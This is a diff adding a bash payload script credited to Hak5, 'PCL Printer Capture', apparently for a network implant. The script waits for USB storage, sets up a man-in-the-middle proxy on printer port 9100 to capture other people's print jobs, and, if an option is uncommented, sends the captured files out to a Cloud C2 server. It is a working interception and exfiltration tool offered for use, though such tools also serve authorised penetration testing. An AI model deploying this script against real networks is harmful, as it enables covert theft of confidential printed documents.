@@ -1,0 +1,53 @@
+#!/bin/bash
+
+# Title:        PCL Printer Capture
+# Description:  Capture PCL IP printer jobs with a dynamic proxy 
+# Author:       Hak5
+
+# To convert PCL files to PDF, use a tool like GhostPCL:
+# https://ghostscript.com/releases/gpcldnld.html 
+#
+# To convert a stream (captured-file.stream) to PDF (printed.pdf), use something 
+# like:
+# ./gpcl6-1000-linux-x86_64 -o printed.pdf -sDEVICE=pdfwrite captured-file.stream 
+
+# Do we automatically exfiltrate to Cloud C2?  Uncomment to send files to your 
+# CloudC2 server automatically
+# 
+# USE_C2=1
+
+# By default, C2WATCHDIR removes files after they're sent.  To keep them, uncomment 
+# C2_KEEP_FILES below
+# 
+# C2_KEEP_FILES=1
+
+LED SETUP
+
+NETMODE NAT
+
+# We have to have attached USB
+USB_WAIT
+
+# Make sure the directory exists
+mkdir /usb/printer/
+
+# If USE_C2 isn't empty, we're uploading to CloudC2
+if [[ ! -z "$USE_C2" ]]; then
+	# If C2_KEEP_FILES is not empty, we want to preserve the
+    # files on USB, otherwise run C2WATCHDIR normally and delete
+    # the files after they are sent.
+	if [[ ! -z "$C2_KEEP_FILES" ]]; then
+    	C2_KEEP_FILES=1 C2WATCHDIR /usb/printer/ &
+    else
+        C2WATCHDIR /usb/printer/ &
+    fi
+    
+	# Give C2WATCHDIR a moment to sync any old files that were present
+	sleep 3
+fi
+
+LED ATTACK
+
+# Use a dynamic proxy to MITM standard PCL IP printers
+DYNAMICPROXY CLIENT /usb/printer/print_ 9100 
+
